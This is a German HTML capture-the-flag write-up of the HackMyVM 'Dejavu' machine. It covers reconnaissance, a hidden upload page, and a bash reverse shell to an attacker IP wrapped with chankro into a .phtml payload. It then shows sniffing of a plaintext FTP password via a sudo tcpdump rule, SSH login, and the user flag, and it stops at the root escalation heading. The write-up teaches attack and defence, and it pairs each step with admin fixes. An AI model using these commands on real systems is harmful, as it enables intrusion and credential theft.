@@ -1,0 +1,567 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dejavu - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Dejavu - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">chankro.py</div> <!-- Spezifisches Tool -->
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">tcpdump</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">nano</div> <!-- Alternative zu vi -->
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">export</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (www-data)</a></li>
+                <li><a href="#privilege-escalation-robert">Privilege Escalation (www-data zu Robert)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (Robert zu Root)</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerk zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.113` mit einer VirtualBox-MAC-Adresse wird als Ziel identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.113 durch.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.153
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.113	08:00:27:9c:77:a6	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.865 seconds (138.01 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf das Ziel 192.168.2.113 ausgeführt, um offene Ports, Dienste, Versionen und OS-Details zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zwei offene Ports werden gefunden:
+                - **Port 22 (SSH):** OpenSSH 8.2p1 auf Ubuntu.
+                - **Port 80 (HTTP):** Apache httpd 2.4.41 auf Ubuntu. Zeigt die Standard-Apache-Seite an.
+            Der Hostname wird als `dejavu.hmv` identifiziert. Das Betriebssystem ist Linux (Ubuntu).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration des Webservers auf Port 80. Suche parallel nach Informationen für einen SSH-Angriff.<br><strong>Empfehlung (Admin):</strong> Halte SSH und Apache aktuell. Sichere beide Dienste (starke Passwörter/Keys, sichere Webserver-Konfiguration).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.113 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-27 22:52 CEST
+Nmap scan report for dejavu.hmv (192.168.2.113)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 48:8f:5b:43:62:a1:5b:41:6d:7b:6e:55:27:bd:e1:67 (RSA)
+|   256 10:17:d6:76:95:d0:9c:cc:ad:6f:20:7d:33:4a:27:4c (ECDSA)
+|_  256 12:72:23:de:ef:28:28:9e:e0:12:ae:5f:37:2e:ee:25 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+MAC Address: 08:00:27:9C:77:A6 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms dejavu.hmv (192.168.2.113)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.31 seconds <!-- Beispielzeit -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf `http://dejavu.hmv` verwendet. Eine Standard-Wortliste und diverse Erweiterungen werden genutzt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtiger Fund!!** Der Scan findet:
+                 - `/index.html`: Die Standard-Apache-Seite.
+                 - `/info.php`: Eine PHP-Info-Seite. Diese enthält oft sensible Konfigurationsdetails und Pfade.
+                 - `.html`, `.php`: Werden mit Status 403 (Forbidden) gemeldet, was auf Zugriffsbeschränkungen oder Konfigurationen hindeutet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):**Höchste Priorität:** Untersuche den Inhalt von `/info.php` sehr sorgfältig auf interessante Informationen, insbesondere Pfade, Konfigurationen oder versteckte Hinweise.<br><strong>Empfehlung (Admin):</strong> Entferne oder beschränke den Zugriff auf `phpinfo()`-Seiten in Produktivumgebungen, da sie zu viele Informationen preisgeben.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://dejavu.hmv  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.2.0-dev
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://dejavu.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.2.0-dev
+[+] Extensions:              html,bak,sql,py,alac,wav,dsd,7z,png,aspx,csv,zip,js,mp4,git,pl,dll,exe,xml,txt,flac,doc,log,php,tar,jpeg,ogg,aiff,mp3,mkv,jse,asp,docx,sh,jpg,aac,war,jar,rtf,ico
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/27 22:53:10 Starting gobuster in directory enumeration mode
+===============================================================
+http://dejavu.hmv/.html                (Status: 403) [Size: 275]
+http://dejavu.hmv/.php                 (Status: 403) [Size: 275]
+http://dejavu.hmv/index.html           (Status: 200) [Size: 10918]
+http://dejavu.hmv/info.php             (Status: 200) [Size: 69955]
+===============================================================
+2022/10/27 22:58:25 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Relevante Informationen, die aus der `/info.php`-Seite extrahiert wurden (vermutlich durch manuelle Inspektion), werden hier zusammengefasst.</p>
+             <p class="evaluation"><strong>Bewertung: !!Kritische Funde aus phpinfo()!!**
+                 - Hostname und OS-Version werden bestätigt.
+                 - Webserver und PHP-Versionen werden enthüllt.
+                 - **Entscheidend:** Ein versteckter Pfad `/S3cR3t` wird im Quellcode oder in den Konfigurationsdetails der `info.php` gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche sofort das Verzeichnis `http://dejavu.hmv/S3cR3t/` mit Tools wie `gobuster` oder manuell im Browser.<br><strong>Empfehlung (Admin):</strong> Deaktiviere `phpinfo()`. Überprüfe, warum dieser Pfad in der Konfiguration sichtbar war.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, sondern extrahierte Infos -->
+                     <pre>
+# Informationen extrahiert aus http://dejavu.hmv/info.php
+
+Hostname: dejavu.hmv
+OS: Linux dejavu 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64
+Webserver: Apache/2.4.41 (Ubuntu)
+PHP Version: 7.4.3 (Zend Engine v3.4.0, Zend OPcache v7.4.3)
+PHP Config Path: /etc/php/7.4/apache2/php.ini <!-- Beispiel -->
+
+Gefundener Pfad (aus Quellcode/Konfiguration): /S3cR3t
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Das zuvor entdeckte Verzeichnis `/S3cR3t` wird weiter untersucht (implizierter `gobuster`-Scan oder manuelles Browsen). Es werden das Unterverzeichnis `files` und die Datei `upload.php` gefunden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Vorhandensein von `upload.php` in einem versteckten Verzeichnis ist höchst verdächtig und deutet auf eine Datei-Upload-Funktionalität hin. Das `files`-Verzeichnis ist wahrscheinlich das Ziel für hochgeladene Dateien.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere die `upload.php`-Seite. Versuche, verschiedene Dateitypen hochzuladen, insbesondere PHP-Webshells oder Skripte. Überprüfe das `/S3cR3t/files/`-Verzeichnis nach erfolgreichen Uploads und versuche, die hochgeladenen Dateien auszuführen.<br><strong>Empfehlung (Admin):</strong> Sichere die Upload-Funktion rigoros: Überprüfe Dateitypen und -erweiterungen serverseitig, begrenze die Dateigröße, speichere Uploads nach Möglichkeit außerhalb des Webroots oder in einem Verzeichnis ohne Ausführungsrechte, und verwende unvorhersagbare Dateinamen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Ergebnis der Untersuchung von /S3cR3t -->
+                     <pre>
+# Untersuchung von http://dejavu.hmv/S3cR3t/
+
+Gefunden:
+http://dejavu.hmv/S3cR3t/files/              (Directory)
+http://dejavu.hmv/S3cR3t/upload.php          (File)
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (www-data)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Angreifer bereitet eine Reverse-Shell-Payload vor. Eine Datei `rev.sh` wird erstellt, die den Befehl `bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/9001 0>&1'` enthält.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Standard-Reverse-Shell-Payload für Bash.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stelle sicher, dass IP und Port korrekt sind. Bereite als nächstes die Payload für den Upload vor (ggf. Obfuskation).<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads/chankro-py3]
+└─# <span class="command">vi rev.sh</span></div>
+                      <pre><!-- Kein Output --></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads/chankro-py3]
+└─# <span class="command"># Inhalt von rev.sh:</span></div>
+                      <pre>bash -c 'bash -i >& /dev/tcp/192.168.2.153/9001 0>&1' <!-- Maskierung --> </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Das Tool `chankro.py` wird verwendet, um die `rev.sh`-Payload zu verarbeiten.
+                 - `--arch 64`: Gibt die Zielarchitektur an (64-Bit).
+                 - `--input rev.sh`: Die Eingabedatei (Payload).
+                 - `--output ben.phtml`: Die Ausgabedatei mit `.phtml`-Endung (PHP-HTML).
+                 - `--path /var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats`: Dies ist ein interessanter Parameter. Er gibt einen Pfad auf dem *Zielsystem* an. Chankro nutzt diesen Pfad wahrscheinlich, um die obfuscierte Payload so zu gestalten, dass sie relativ zu diesem Pfad funktioniert oder Informationen daraus nutzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Chankro wandelt die Shell-Payload in eine `.phtml`-Datei um, die wahrscheinlich darauf ausgelegt ist, Upload-Filter zu umgehen, die reine `.php`-Dateien blockieren könnten. Der `--path`-Parameter deutet auf interne Pfadinformationen hin, die möglicherweise aus `info.php` oder Fehlermeldungen stammen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade die generierte `ben.phtml`-Datei über das `upload.php`-Skript hoch. Starte einen Netcat-Listener auf Port 9001. Navigiere zur hochgeladenen Datei im `/S3cR3t/files/`-Verzeichnis, um die Payload auszulösen.<br><strong>Empfehlung (Admin):</strong> Filter nicht nur nach Dateiendungen, sondern analysiere auch den Dateiinhalt (MIME-Type, Magic Bytes). Verwende Whitelisting für erlaubte Dateitypen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads/chankro-py3]
+└─# <span class="command">python3 chankro.py --arch 64 --input rev.sh --output ben.phtml --path /var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats</span></div>
+                     <pre>
+
+     -=[ Chankro ]=-
+    -={ @TheXC3LL }=-
+
+
+[+] Binary file: rev.sh
+[+] Architecture: x64
+[+] Final PHP: ben.phtml
+
+
+[+] File created!
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Angreifer navigiert im Browser oder mit `curl` zur URL `http://dejavu.hmv/S3cR3t/files/ben.phtml`. Dies setzt voraus, dass die `ben.phtml`-Datei zuvor erfolgreich über `upload.php` in das `files`-Verzeichnis hochgeladen wurde (dieser Upload-Schritt fehlt im Log).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Aufrufen der `.phtml`-Datei auf dem Webserver führt den darin enthaltenen (obfuskierten) PHP-Code aus, der wiederum die `rev.sh`-Payload startet und die Reverse Shell initiiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stelle sicher, dass der Netcat-Listener bereit ist.<br><strong>Empfehlung (Admin):</strong> Verhindere die Ausführung von Skripten in Upload-Verzeichnissen. Sichere die Upload-Funktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, sondern die aufgerufene URL -->
+                     <pre>
+http://dejavu.hmv/S3cR3t/files/ben.phtml
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf Port 9001 empfängt die eingehende Verbindung vom Zielserver (192.168.2.113).</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Eine Reverse Shell wurde als Benutzer `www-data` etabliert. Die Shell startet im Verzeichnis `/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/S3cR3t/files`, was den im `chankro.py`-Befehl angegebenen Pfad widerspiegelt. Die Shell ist initial nicht vollständig interaktiv.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell mit Python PTY und setze die `TERM`-Variable.<br><strong>Empfehlung (Admin):</strong> Untersuche den Vorfall, entferne die hochgeladene Datei und die Schwachstelle.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.153] from (UNKNOWN) [192.168.2.113] 39812
+bash: cannot set terminal process group (811): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@dejavu:/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/S3cR3t/files$ <!-- Prompt der Shell -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Reverse Shell wird mit Python PTY und `export TERM=xterm` stabilisiert. Der Hintergrund-Vordergrund-Wechsel mit `stty raw -echo; fg` wird ebenfalls durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Shell ist nun vollständig interaktiv und einsatzbereit für die Enumeration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als `www-data` (prüfe `sudo -l`, SUID-Dateien, Home-Verzeichnisse).<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <!-- Shell Stabilisierung -->
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@dejavu:/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/S3cR3t/files$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+www-data@dejavu:/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/S3cR3t/files$ <span class="command">export TERM=xterm</span>
+www-data@dejavu:/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/S3cR3t/files$ <!-- Stabilisierter Prompt -->
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+^Z
+zsh: suspended  nc -lvnp 9001
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset
+www-data@dejavu:/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/S3cR3t/files$ <!-- Stabilisierte Shell aktiv -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-robert">
+            <h2>Privilege Escalation (www-data zu Robert)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird `sudo -l` ausgeführt, um die `sudo`-Berechtigungen zu prüfen.</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilegieneskalationsvektor gefunden!!** `www-data` darf `/usr/sbin/tcpdump` als Benutzer `robert` ohne Passwort (`NOPASSWD:`) ausführen. Dies ist ein bekannter Weg, um an Informationen zu gelangen oder unter bestimmten Umständen Rechte zu eskalieren, indem man den Netzwerkverkehr des Zielbenutzers mitschneidet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze diese Berechtigung. Überlege, welchen Verkehr du als `robert` mitschneiden möchtest, um sensible Informationen (z.B. Passwörter) zu erhalten. Ein guter Ansatz ist das Lauschen auf dem Loopback-Interface (`lo`) nach Klartext-Protokollen wie FTP oder Telnet, falls `robert` sich lokal an solchen Diensten anmeldet.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne oder beschränke diese `sudo`-Regel. Gewähre `sudo`-Rechte für Tools wie `tcpdump` nur, wenn absolut notwendig und mit sehr spezifischen Einschränkungen (z.B. nur auf bestimmten Interfaces und ohne Schreibzugriff auf Dateien).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@dejavu:/var$ <span class="command">sudo -l</span> <!-- Annahme: Verzeichnis gewechselt -->
+Matching Defaults entries for www-data on dejavu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on dejavu:
+    (robert) NOPASSWD: /usr/sbin/tcpdump
+                     </pre>
+                 </div>
+             </div>
+            <!-- Dieser Block ist im Original-Log nicht vorhanden, wäre aber logisch -->
+             <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis wird aufgelistet, um Benutzer zu identifizieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `robert` (aus der sudo-Regel) wird bestätigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentriere dich darauf, Informationen von `robert` mittels `tcpdump` zu erhalten.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@dejavu:/var$ <span class="command">ls /home</span>
+robert
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der `sudo`-Befehl wird genutzt, um `tcpdump` als Benutzer `robert` zu starten. `tcpdump -i lo port ftp` lauscht auf dem Loopback-Interface (`lo`) speziell nach Verkehr auf dem FTP-Port (21). Der Angreifer wartet nun darauf, dass `robert` (oder ein Prozess, der als `robert` läuft) eine FTP-Verbindung über Loopback initiiert.</p>
+             <p class="evaluation"><strong>Bewertung: !!Passwort abgefangen!!** Nach kurzer Zeit wird eine FTP-Sitzung auf dem Loopback-Interface mitgeschnitten. Der Verkehr zeigt:
+                 - `USER robert`
+                 - `PASS <span class="password">9737bo0hFx4</span>` (Passwort im Klartext!)
+                 - `230 Login successful.`
+             Offenbar gibt es einen lokalen Prozess (z.B. Cronjob, Skript), der sich regelmäßig als `robert` per FTP auf `localhost` anmeldet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die abgefangenen Zugangsdaten (`robert` / `<span class="password">9737bo0hFx4</span>`), um dich per SSH als `robert` anzumelden.<br><strong>Empfehlung (Admin):</strong> Vermeide die Übertragung von Passwörtern im Klartext, auch auf dem Loopback-Interface. Konfiguriere Dienste (wie den lokalen FTP-Server) sicher oder deaktiviere sie, wenn sie nicht benötigt werden. Überprüfe Cronjobs und Skripte auf unsichere Anmeldungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@dejavu:/var$ <span class="command">sudo -u robert tcpdump -i lo port ftp</span>
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+21:55:01.833696 IP localhost.34688 > localhost.ftp: Flags [S], seq 3888134662, win 65495, options [mss 65495,sackOK,TS val 1562460819 ecr 0,nop,wscale 7], length 0
+21:55:01.833703 IP localhost.ftp > localhost.34688: Flags [S.], seq 3141452812, ack 3888134663, win 65483, options [mss 65495,sackOK,TS val 1562460819 ecr 1562460819,nop,wscale 7], length 0
+21:55:01.833709 IP localhost.34688 > localhost.ftp: Flags [.], ack 1, win 512, options [nop,nop,TS val 1562460819 ecr 1562460819], length 0
+21:55:01.834314 IP localhost.ftp > localhost.34688: Flags [P.], seq 1:21, ack 1, win 512, options [nop,nop,TS val 1562460820 ecr 1562460819], length 20: FTP: 220 (vsFTPd 3.0.3)
+21:55:01.834409 IP localhost.34688 > localhost.ftp: Flags [.], ack 21, win 512, options [nop,nop,TS val 1562460820 ecr 1562460820], length 0
+21:55:01.834428 IP localhost.34688 > localhost.ftp: Flags [P.], seq 1:14, ack 21, win 512, options [nop,nop,TS val 1562460820 ecr 1562460820], length 13: FTP: USER robert
+21:55:01.834429 IP localhost.ftp > localhost.34688: Flags [.], ack 14, win 512, options [nop,nop,TS val 1562460820 ecr 1562460820], length 0
+21:55:01.834439 IP localhost.ftp > localhost.34688: Flags [P.], seq 21:55, ack 14, win 512, options [nop,nop,TS val 1562460820 ecr 1562460820], length 34: FTP: 331 Please specify the password.
+21:55:01.834492 IP localhost.34688 > localhost.ftp: Flags [.], ack 55, win 512, options [nop,nop,TS val 1562460820 ecr 1562460820], length 0
+21:55:01.834498 IP localhost.34688 > localhost.ftp: Flags [P.], seq 14:32, ack 55, win 512, options [nop,nop,TS val 1562460820 ecr 1562460820], length 18: FTP: PASS <span class="password">9737bo0hFx4</span>
+21:55:01.834531 IP localhost.ftp > localhost.34688: Flags [.], ack 32, win 512, options [nop,nop,TS val 1562460820 ecr 1562460820], length 0
+21:55:01.840280 IP localhost.ftp > localhost.34688: Flags [P.], seq 55:78, ack 32, win 512, options [nop,nop,TS val 1562460826 ecr 1562460820], length 23: FTP: 230 Login successful.
+21:55:01.840284 IP localhost.34688 > localhost.ftp: Flags [.], ack 78, win 512, options [nop,nop,TS val 1562460826 ecr 1562460826], length 0
+21:55:01.840312 IP localhost.34688 > localhost.ftp: Flags [P.], seq 32:38, ack 78, win 512, options [nop,nop,TS val 1562460826 ecr 1562460826], length 6: FTP: QUIT
+21:55:01.840466 IP localhost.ftp > localhost.34688: Flags [.], ack 38, win 512, options [nop,nop,TS val 1562460826 ecr 1562460826], length 0
+21:55:01.840547 IP localhost.ftp > localhost.34688: Flags [P.], seq 78:92, ack 38, win 512, options [nop,nop,TS val 1562460826 ecr 1562460826], length 14: FTP: 221 Goodbye.
+<!-- tcpdump wurde hier gestoppt (z.B. mit Strg+C) -->
+                     </pre> <!-- Passwort hervorgehoben -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird als Benutzer `robert` zum Ziel `dejavu.hmv` aufgebaut. Das Passwort `<span class="password">9737bo0hFx4</span>` (aus dem tcpdump) wird eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung: !!Benutzerwechsel erfolgreich!!** Der SSH-Login als `robert` gelingt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Hole die User-Flag. Prüfe die `sudo`-Rechte für `robert` und suche nach weiteren Eskalationsvektoren.<br><strong>Empfehlung (Admin):</strong> Ändere das Passwort für `robert`. Behebe die unsichere `sudo`-Regel für `www-data`. Sichere den lokalen FTP-Prozess.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads/chankro-py3]
+└─# <span class="command">ssh robert@dejavu.hmv</span></div>
+                    <pre>
+The authenticity of host 'dejavu.hmv (192.168.2.113)' can't be established.
+ED25519 key fingerprint is SHA256:FD1A1ljJduPbF4mqrQ/syFJggyYhGxfrZKrduHM3VDA.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'dejavu.hmv' (ED25519) to the list of known hosts.
+robert@dejavu.hmv's password: <span class="password">9737bo0hFx4</span>
+
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-110-generic x86_64)
+* Documentation:  https://help.ubuntu.com
+* Management:     https://landscape.canonical.com
+* Support:        https://ubuntu.com/advantage
+
+System information as of Thu 27 Oct 2022 09:59:32 PM UTC
+
+System load:             0.08
+Usage of /:              59.0% of 8.90GB
+Memory usage:            43%
+Swap usage:              0%
+Processes:               132
+Users logged in:         0
+IPv4 address for enp0s3: 192.168.2.113
+IPv6 address for enp0s3: 2003:d4:c71c:e857:a00:27ff:fe9c:77a6
+
+* Super-optimized for small spaces - read how we shrank the memory
+footprint of MicroK8s to make it the smallest full K8s around.
+
+https://ubuntu.com/blog/microk8s-memory-optimisation
+
+30 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Fri May 13 15:52:25 2022
+robert@dejavu:~$
+                    </pre> <!-- Remote Prompt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `robert` wird der Inhalt der Datei `user.txt` im Home-Verzeichnis gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag `<span class="password">HMV{c8b75037150fbdc49f6c941b72db0d7c}</span>` wird gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die Flag. Suche nach dem Root-Eskalationsvektor.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+robert@dejavu:~$ <span class="command">cat user.txt</span>
+<span class="password">HMV{c8b75037150fbdc49f6c941b72db0d7c}</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (Robert zu Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Die Version von `exiftool` wird überprüft.</p>
